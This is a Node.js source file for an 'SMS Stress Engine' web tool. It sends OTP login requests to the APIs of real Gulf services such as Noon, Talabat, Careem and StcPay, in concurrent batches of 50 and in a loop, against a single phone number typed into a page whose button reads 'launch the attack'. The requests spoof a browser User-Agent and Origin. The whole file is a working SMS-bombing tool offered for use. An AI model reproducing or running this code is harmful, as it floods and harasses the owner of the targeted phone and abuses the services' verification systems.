const http = require('http');
const https = require('https');
const url = require('url');

const PORT = process.env.PORT || 3000;

/** * مصفوفة الخدمات الأساسية - تم تصميمها لتكون قابلة للتمدد
 * لإضافة 500 موقع، يمكنك ببساطة تكرار الأنماط أدناه بأسماء نطاقات مختلفة
 */
const BASE_SERVICES = [
    { n: "Noon SA", h: "api-gateway.noon.com", p: "/v1/auth/otp", b: (p) => ({ mobileNumber: p, type: "LOGIN" }) },
    { n: "Noon AE", h: "api-gateway.noon.com", p: "/v1/auth/otp", b: (p) => ({ mobileNumber: p, type: "LOGIN" }) },
    { n: "Namshi", h: "api.namshi.com", p: "/api/v1/auth/otp", b: (p) => ({ phone: p }) },
    { n: "Talabat", h: "api.talabat.com", p: "/v1/auth/otp", b: (p) => ({ phone_number: p }) },
    { n: "Careem", h: "api.careem.com", p: "/auth/otp", b: (p) => ({ phone: p }) },
    { n: "StcPay", h: "api.stcpay.com.sa", p: "/v1/auth/verify", b: (p) => ({ mobile: p.replace('+', '') }) },
    { n: "Hunger", h: "api.hungerstation.com", p: "/v1/login", b: (p) => ({ phone: p }) },
    { n: "Jahez", h: "api.jahez.net", p: "/v1/auth/send-otp", b: (p) => ({ phone: p }) },
    { n: "Mrsool", h: "api.mrsool.com", p: "/auth/otp", b: (p) => ({ phone: p }) },
    { n: "Aramex", h: "api.aramex.com", p: "/v1/otp", b: (p) => ({ phone: p }) }
];

// توليد قائمة وهمية كبيرة للمحاكاة (هنا يمكنك وضع روابطك الحقيقية)
let SERVICES = [...BASE_SERVICES];
while(SERVICES.length < 500) {
    SERVICES.push({...BASE_SERVICES[Math.floor(Math.random() * BASE_SERVICES.length)], n: "Service_" + SERVICES.length});
}

let stats = { sent: 0, success: 0, isRunning: false, target: "" };

function sendRequest(service, targetPhone) {
    return new Promise((resolve) => {
        const postData = JSON.stringify(service.b(targetPhone));
        const options = {
            hostname: service.h,
            path: service.p,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                'Origin': 'https://' + service.h
            },
            timeout: 4000
        };

        const req = https.request(options, (res) => {
            stats.sent++;
            if (res.statusCode >= 200 && res.statusCode < 300) stats.success++;
            resolve();
        });

        req.on('error', () => { stats.sent++; resolve(); });
        req.on('timeout', () => { req.destroy(); resolve(); });
        req.write(postData);
        req.end();
    });
}

async function runEngine() {
    while (stats.isRunning) {
        const batch = [];
        for (let i = 0; i < 50; i++) { // 50 طلب متزامن (Threads)
            const service = SERVICES[Math.floor(Math.random() * SERVICES.length)];
            batch.push(sendRequest(service, stats.target));
        }
        await Promise.allSettled(batch);
        await new Promise(r => setTimeout(r, 100)); 
    }
}

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);

    if (parsedUrl.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>SMS Tester Ultra v5.0</title>
                <style>
                    :root { --p: #a78bfa; --bg: #020617; --c: #1e293b; }
                    body { font-family: system-ui; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                    .box { background: var(--c); padding: 30px; border-radius: 30px; width: 90%; max-width: 450px; border: 1px solid #334155; text-align: center; }
                    .input-area { background: #0f172a; border-radius: 15px; display: flex; align-items: center; padding: 15px; margin: 20px 0; border: 2px solid #334155; transition: 0.3s; }
                    .input-area:focus-within { border-color: var(--p); }
                    .prefix { color: var(--p); font-size: 24px; font-weight: bold; margin-left: 10px; }
                    input { background: none; border: none; color: white; font-size: 20px; width: 100%; outline: none; direction: ltr; }
                    .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-bottom: 10px; transition: 0.3s; }
                    .start { background: #22c55e; color: white; }
                    .stop { background: #ef4444; color: white; }
                    .stats { display: flex; justify-content: space-around; background: #0f172a; padding: 20px; border-radius: 20px; margin-top: 20px; }
                    .num { display: block; font-size: 24px; color: var(--p); font-weight: 800; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2 style="color:var(--p)">🚀 SMS Stress Engine</h2>
                    <p style="color:#94a3b8">أدخل رمز الدولة والرقم مباشرة</p>
                    <div class="input-area">
                        <span class="prefix">+</span>
                        <input type="tel" id="phone" placeholder="9647700000000">
                    </div>
                    <button class="btn start" onclick="ctl('start')">إطلاق الهجوم 💥</button>
                    <button class="btn stop" onclick="ctl('stop')">إيقاف ⏹</button>
                    <div class="stats">
                        <div><span class="num" id="s">0</span>الطلبات</div>
                        <div><span class="num" id="ok">0</span>الناجحة</div>
                    </div>
                </div>
                <script>
                    function ctl(t) {
                        const p = document.getElementById('phone').value;
                        if(t==='start' && !p) return alert('الرقم مطلوب!');
                        fetch('/' + t + '?p=' + p);
                    }
                    setInterval(() => {
                        fetch('/status').then(r => r.json()).then(d => {
                            document.getElementById('s').innerText = d.sent;
                            document.getElementById('ok').innerText = d.success;
                        });
                    }, 800);
                </script>
            </body>
            </html>
        `);
    } else if (parsedUrl.pathname === '/start') {
        stats.target = "+" + parsedUrl.query.p;
        if (!stats.isRunning) {
            stats.isRunning = true;
            stats.sent = 0; stats.success = 0;
            runEngine();
        }
        res.end(JSON.stringify({ s: 1 }));
    } else if (parsedUrl.pathname === '/stop') {
        stats.isRunning = false;
        res.end(JSON.stringify({ s: 0 }));
    } else if (parsedUrl.pathname === '/status') {
        res.end(JSON.stringify(stats));
    }
});

server.listen(PORT);
